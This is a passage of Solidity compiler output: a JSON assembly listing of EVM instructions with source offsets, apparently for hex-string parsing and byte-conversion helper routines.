											"end": 9379,
											"name": "AND",
											"source": 9
										},
										{
											"begin": 9371,
											"end": 9379,
											"name": "LT",
											"source": 9
										},
										{
											"begin": 9371,
											"end": 9379,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 9370,
											"end": 9394,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 9370,
											"end": 9394,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 9370,
											"end": 9394,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "90"
										},
										{
											"begin": 9370,
											"end": 9394,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 9370,
											"end": 9394,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 9391,
											"end": 9393,
											"name": "PUSH",
											"source": 9,
											"value": "46"
										},
										{
											"begin": 9385,
											"end": 9387,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 9385,
											"end": 9393,
											"name": "PUSH",
											"source": 9,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 9385,
											"end": 9393,
											"name": "AND",
											"source": 9
										},
										{
											"begin": 9385,
											"end": 9393,
											"name": "GT",
											"source": 9
										},
										{
											"begin": 9385,
											"end": 9393,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 9370,
											"end": 9394,
											"name": "tag",
											"source": 9,
											"value": "90"
										},
										{
											"begin": 9370,
											"end": 9394,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 9366,
											"end": 9518,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 9366,
											"end": 9518,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "91"
										},
										{
											"begin": 9366,
											"end": 9518,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 9421,
											"end": 9423,
											"name": "PUSH",
											"source": 9,
											"value": "37"
										},
										{
											"begin": 9415,
											"end": 9423,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 9415,
											"end": 9423,
											"name": "SUB",
											"source": 9
										},
										{
											"begin": 9415,
											"end": 9423,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 9415,
											"end": 9423,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 9366,
											"end": 9518,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "92"
										},
										{
											"begin": 9366,
											"end": 9518,
											"name": "JUMP",
											"source": 9
										},
										{
											"begin": 9366,
											"end": 9518,
											"name": "tag",
											"source": 9,
											"value": "91"
										},
										{
											"begin": 9366,
											"end": 9518,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 9456,
											"end": 9458,
											"name": "PUSH",
											"source": 9,
											"value": "30"
										},
										{
											"begin": 9450,
											"end": 9452,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 9450,
											"end": 9458,
											"name": "PUSH",
											"source": 9,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 9450,
											"end": 9458,
											"name": "AND",
											"source": 9
										},
										{
											"begin": 9450,
											"end": 9458,
											"name": "LT",
											"source": 9
										},
										{
											"begin": 9450,
											"end": 9458,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 9449,
											"end": 9473,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 9449,
											"end": 9473,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 9449,
											"end": 9473,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "93"
										},
										{
											"begin": 9449,
											"end": 9473,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 9449,
											"end": 9473,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 9470,
											"end": 9472,
											"name": "PUSH",
											"source": 9,
											"value": "39"
										},
										{
											"begin": 9464,
											"end": 9466,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 9464,
											"end": 9472,
											"name": "PUSH",
											"source": 9,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 9464,
											"end": 9472,
											"name": "AND",
											"source": 9
										},
										{
											"begin": 9464,
											"end": 9472,
											"name": "GT",
											"source": 9
										},
										{
											"begin": 9464,
											"end": 9472,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 9449,
											"end": 9473,
											"name": "tag",
											"source": 9,
											"value": "93"
										},
										{
											"begin": 9449,
											"end": 9473,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 9445,
											"end": 9518,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 9445,
											"end": 9518,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "94"
										},
										{
											"begin": 9445,
											"end": 9518,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 9500,
											"end": 9502,
											"name": "PUSH",
											"source": 9,
											"value": "30"
										},
										{
											"begin": 9494,
											"end": 9502,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 9494,
											"end": 9502,
											"name": "SUB",
											"source": 9
										},
										{
											"begin": 9494,
											"end": 9502,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 9494,
											"end": 9502,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 9445,
											"end": 9518,
											"name": "tag",
											"source": 9,
											"value": "94"
										},
										{
											"begin": 9445,
											"end": 9518,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 9366,
											"end": 9518,
											"name": "tag",
											"source": 9,
											"value": "92"
										},
										{
											"begin": 9366,
											"end": 9518,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 9286,
											"end": 9518,
											"name": "tag",
											"source": 9,
											"value": "89"
										},
										{
											"begin": 9286,
											"end": 9518,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 9552,
											"end": 9554,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 9547,
											"end": 9549,
											"name": "PUSH",
											"source": 9,
											"value": "10"
										},
										{
											"begin": 9542,
											"end": 9544,
											"name": "DUP5",
											"source": 9
										},
										{
											"begin": 9542,
											"end": 9549,
											"name": "MUL",
											"source": 9
										},
										{
											"begin": 9542,
											"end": 9554,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 9532,
											"end": 9555,
											"name": "DUP5",
											"source": 9
										},
										{
											"begin": 9532,
											"end": 9555,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 9532,
											"end": 9555,
											"name": "SWAP4",
											"source": 9
										},
										{
											"begin": 9532,
											"end": 9555,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 8907,
											"end": 8908,
											"name": "PUSH",
											"source": 9,
											"value": "2"
										},
										{
											"begin": 8902,
											"end": 8908,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 8902,
											"end": 8908,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 8902,
											"end": 8908,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 8902,
											"end": 8908,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 8869,
											"end": 9567,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "74"
										},
										{
											"begin": 8869,
											"end": 9567,
											"name": "JUMP",
											"source": 9
										},
										{
											"begin": 8869,
											"end": 9567,
											"name": "tag",
											"source": 9,
											"value": "75"
										},
										{
											"begin": 8869,
											"end": 9567,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 8869,
											"end": 9567,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 9592,
											"end": 9597,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 9577,
											"end": 9598,
											"name": "SWAP5",
											"source": 9
										},
										{
											"begin": 9577,
											"end": 9598,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 9577,
											"end": 9598,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 9577,
											"end": 9598,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 9577,
											"end": 9598,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 9577,
											"end": 9598,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 8666,
											"end": 9606,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 8666,
											"end": 9606,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 8666,
											"end": 9606,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 8666,
											"end": 9606,
											"name": "JUMP",
											"source": 9,
											"value": "[out]"
										},
										{
											"begin": 8402,
											"end": 8494,
											"name": "tag",
											"source": 9,
											"value": "55"
										},
										{
											"begin": 8402,
											"end": 8494,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 8453,
											"end": 8457,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 8477,
											"end": 8486,
											"name": "PUSH",
											"source": 9,
											"value": "B9F1A09"
										},
										{
											"begin": 8470,
											"end": 8486,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 8470,
											"end": 8486,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 8402,
											"end": 8494,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 8402,
											"end": 8494,
											"name": "JUMP",
											"source": 9,
											"value": "[out]"
										},
										{
											"begin": 10168,
											"end": 10608,
											"name": "tag",
											"source": 9,
											"value": "56"
										},
										{
											"begin": 10168,
											"end": 10608,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 10223,
											"end": 10236,
											"name": "PUSH",
											"source": 9,
											"value": "60"
										},
										{
											"begin": 10252,
											"end": 10262,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 10277,
											"end": 10283,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 10286,
											"end": 10287,
											"name": "DUP4",
											"source": 9
										},
										{
											"begin": 10277,
											"end": 10287,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 10277,
											"end": 10287,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 10298,
											"end": 10369,
											"name": "tag",
											"source": 9,
											"value": "97"
										},
										{
											"begin": 10298,
											"end": 10369,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 10310,
											"end": 10311,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 10305,
											"end": 10306,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 10305,
											"end": 10311,
											"name": "EQ",
											"source": 9
										},
										{
											"begin": 10298,
											"end": 10369,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "98"
										},
										{
											"begin": 10298,
											"end": 10369,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 10328,
											"end": 10335,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 10328,
											"end": 10335,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 10328,
											"end": 10335,
											"name": "PUSH",
											"source": 9,
											"value": "1"
										},
										{
											"begin": 10328,
											"end": 10335,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 10328,
											"end": 10335,
											"name": "SWAP3",
											"source": 9
										},
										{
											"begin": 10328,
											"end": 10335,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 10328,
											"end": 10335,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 10355,
											"end": 10357,
											"name": "PUSH",
											"source": 9,
											"value": "10"
										},
										{
											"begin": 10350,
											"end": 10357,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 10350,
											"end": 10357,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 10350,
											"end": 10357,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "99"
										},
										{
											"begin": 10350,
											"end": 10357,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 10350,
											"end": 10357,
											"name": "INVALID",
											"source": 9
										},
										{
											"begin": 10350,
											"end": 10357,
											"name": "tag",
											"source": 9,
											"value": "99"
										},
										{
											"begin": 10350,
											"end": 10357,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 10350,
											"end": 10357,
											"name": "DIV",
											"source": 9
										},
										{
											"begin": 10350,
											"end": 10357,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 10350,
											"end": 10357,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 10298,
											"end": 10369,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "97"
										},
										{
											"begin": 10298,
											"end": 10369,
											"name": "JUMP",
											"source": 9
										},
										{
											"begin": 10298,
											"end": 10369,
											"name": "tag",
											"source": 9,
											"value": "98"
										},
										{
											"begin": 10298,
											"end": 10369,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 10379,
											"end": 10395,
											"name": "PUSH",
											"source": 9,
											"value": "60"
										},
										{
											"begin": 10408,
											"end": 10413,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "PUSH",
											"source": 9,
											"value": "FFFFFFFFFFFFFFFF"
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "GT",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "100"
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "REVERT",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "tag",
											"source": 9,
											"value": "100"
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "PUSH",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "PUSH",
											"source": 9,
											"value": "1F"
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "PUSH",
											"source": 9,
											"value": "1F"
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "NOT",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "AND",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "PUSH",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "101"
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "PUSH",
											"source": 9,
											"value": "1"
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "MUL",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "CALLDATASIZE",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "DUP4",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "CALLDATACOPY",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "tag",
											"source": 9,
											"value": "101"
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 10398,
											"end": 10414,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 10379,
											"end": 10414,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 10379,
											"end": 10414,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 10430,
											"end": 10436,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 10425,
											"end": 10569,
											"name": "tag",
											"source": 9,
											"value": "102"
										},
										{
											"begin": 10425,
											"end": 10569,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 10442,
											"end": 10447,
											"name": "DUP4",
											"source": 9
										},
										{
											"begin": 10440,
											"end": 10441,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 10440,
											"end": 10447,
											"name": "LT",
											"source": 9
										},
										{
											"begin": 10425,
											"end": 10569,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 10425,
											"end": 10569,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "103"
										},
										{
											"begin": 10425,
											"end": 10569,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 10477,
											"end": 10479,
											"name": "PUSH",
											"source": 9,
											"value": "10"
										},
										{
											"begin": 10473,
											"end": 10474,
											"name": "DUP7",
											"source": 9
										},
										{
											"begin": 10473,
											"end": 10479,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 10473,
											"end": 10479,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "105"
										},
										{
											"begin": 10473,
											"end": 10479,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 10473,
											"end": 10479,
											"name": "INVALID",
											"source": 9
										},
										{
											"begin": 10473,
											"end": 10479,
											"name": "tag",
											"source": 9,
											"value": "105"
										},
										{
											"begin": 10473,
											"end": 10479,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 10473,
											"end": 10479,
											"name": "MOD",
											"source": 9
										},
										{
											"begin": 10469,
											"end": 10479,
											"name": "SWAP3",
											"source": 9
										},
										{
											"begin": 10469,
											"end": 10479,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 10515,
											"end": 10535,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "106"
										},
										{
											"begin": 10532,
											"end": 10533,
											"name": "DUP4",
											"source": 9
										},
										{
											"begin": 10515,
											"end": 10525,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "107"
										},
										{
											"begin": 10515,
											"end": 10535,
											"name": "JUMP",
											"source": 9,
											"value": "[in]"
										},
										{
											"begin": 10515,
											"end": 10535,
											"name": "tag",
											"source": 9,
											"value": "106"
										},
										{
											"begin": 10515,
											"end": 10535,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 10494,
											"end": 10497,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 10510,
											"end": 10511,
											"name": "PUSH",
											"source": 9,
											"value": "1"
										},
										{
											"begin": 10506,
											"end": 10507,
											"name": "DUP4",
											"source": 9
										},
										{
											"begin": 10498,
											"end": 10503,
											"name": "DUP8",
											"source": 9
										},
										{
											"begin": 10498,
											"end": 10507,
											"name": "SUB",
											"source": 9
										},
										{
											"begin": 10498,
											"end": 10511,
											"name": "SUB",
											"source": 9
										},
										{
											"begin": 10494,
											"end": 10512,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 10494,
											"end": 10512,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 10494,
											"end": 10512,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 10494,
											"end": 10512,
											"name": "LT",
											"source": 9
										},
										{
											"begin": 10494,
											"end": 10512,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "108"
										},
										{
											"begin": 10494,
											"end": 10512,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 10494,
											"end": 10512,
											"name": "INVALID",
											"source": 9
										},
										{
											"begin": 10494,
											"end": 10512,
											"name": "tag",
											"source": 9,
											"value": "108"
										},
										{
											"begin": 10494,
											"end": 10512,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 10494,
											"end": 10512,
											"name": "PUSH",
											"source": 9,
											"value": "20"
										},
										{
											"begin": 10494,
											"end": 10512,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 10494,
											"end": 10512,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 10494,
											"end": 10535,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 10494,
											"end": 10535,
											"name": "PUSH",
											"source": 9,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 10494,
											"end": 10535,
											"name": "NOT",
											"source": 9
										},
										{
											"begin": 10494,
											"end": 10535,
											"name": "AND",
											"source": 9
										},
										{
											"begin": 10494,
											"end": 10535,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 10494,
											"end": 10535,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 10494,
											"end": 10535,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 10494,
											"end": 10535,
											"name": "BYTE",
											"source": 9
										},
										{
											"begin": 10494,
											"end": 10535,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 10494,
											"end": 10535,
											"name": "MSTORE8",
											"source": 9
										},
										{
											"begin": 10494,
											"end": 10535,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 10555,
											"end": 10557,
											"name": "PUSH",
											"source": 9,
											"value": "10"
										},
										{
											"begin": 10550,
											"end": 10557,
											"name": "DUP7",
											"source": 9
										},
										{
											"begin": 10550,
											"end": 10557,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 10550,
											"end": 10557,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "109"
										},
										{
											"begin": 10550,
											"end": 10557,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 10550,
											"end": 10557,
											"name": "INVALID",
											"source": 9
										},
										{
											"begin": 10550,
											"end": 10557,
											"name": "tag",
											"source": 9,
											"value": "109"
										},
										{
											"begin": 10550,
											"end": 10557,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 10550,
											"end": 10557,
											"name": "DIV",
											"source": 9
										},
										{
											"begin": 10550,
											"end": 10557,
											"name": "SWAP6",
											"source": 9
										},
										{
											"begin": 10550,
											"end": 10557,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 10449,
											"end": 10452,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 10449,
											"end": 10452,
											"name": "PUSH",
											"source": 9,
											"value": "1"
										},
										{
											"begin": 10449,
											"end": 10452,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 10449,
											"end": 10452,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 10449,
											"end": 10452,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 10425,
											"end": 10569,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "102"
										},
										{
											"begin": 10425,
											"end": 10569,
											"name": "JUMP",
											"source": 9
										},
										{
											"begin": 10425,
											"end": 10569,
											"name": "tag",
											"source": 9,
											"value": "103"
										},
										{
											"begin": 10425,
											"end": 10569,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 10425,
											"end": 10569,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 10596,
											"end": 10599,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 10582,
											"end": 10600,
											"name": "SWAP4",
											"source": 9
										},
										{
											"begin": 10582,
											"end": 10600,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 10582,
											"end": 10600,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 10582,
											"end": 10600,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 10582,
											"end": 10600,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 10168,
											"end": 10608,
											"name": "SWAP2",
											"source": 9
										},
										{
											"begin": 10168,
											"end": 10608,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 10168,
											"end": 10608,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 10168,
											"end": 10608,
											"name": "JUMP",
											"source": 9,
											"value": "[out]"
										},
										{
											"begin": 16932,
											"end": 17567,
											"name": "tag",
											"source": 9,
											"value": "57"
										},
										{
											"begin": 16932,
											"end": 17567,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 17015,
											"end": 17028,
											"name": "PUSH",
											"source": 9,
											"value": "60"
										},
										{
											"begin": 17041,
											"end": 17064,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 17073,
											"end": 17078,
											"name": "DUP4",
											"source": 9
										},
										{
											"begin": 17041,
											"end": 17079,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 17041,
											"end": 17079,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 17090,
											"end": 17114,
											"name": "PUSH",
											"source": 9,
											"value": "60"
										},
										{
											"begin": 17123,
											"end": 17129,
											"name": "DUP4",
											"source": 9
										},
										{
											"begin": 17090,
											"end": 17130,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 17090,
											"end": 17130,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 17144,
											"end": 17167,
											"name": "PUSH",
											"source": 9,
											"value": "60"
										},
										{
											"begin": 17201,
											"end": 17212,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 17201,
											"end": 17219,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 17181,
											"end": 17191,
											"name": "DUP4",
											"source": 9
										},
										{
											"begin": 17181,
											"end": 17198,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 17181,
											"end": 17219,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "PUSH",
											"source": 9,
											"value": "FFFFFFFFFFFFFFFF"
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "DUP2",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "GT",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "ISZERO",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "PUSH [tag]",
											"source": 9,
											"value": "111"
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "JUMPI",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "PUSH",
											"source": 9,
											"value": "0"
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "REVERT",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "tag",
											"source": 9,
											"value": "111"
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "JUMPDEST",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "POP",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "PUSH",
											"source": 9,
											"value": "40"
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "MLOAD",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "SWAP1",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "DUP3",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "MSTORE",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "DUP1",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "PUSH",
											"source": 9,
											"value": "1F"
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "ADD",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "PUSH",
											"source": 9,
											"value": "1F"
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "NOT",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
											"name": "AND",
											"source": 9
										},
										{
											"begin": 17170,
											"end": 17220,
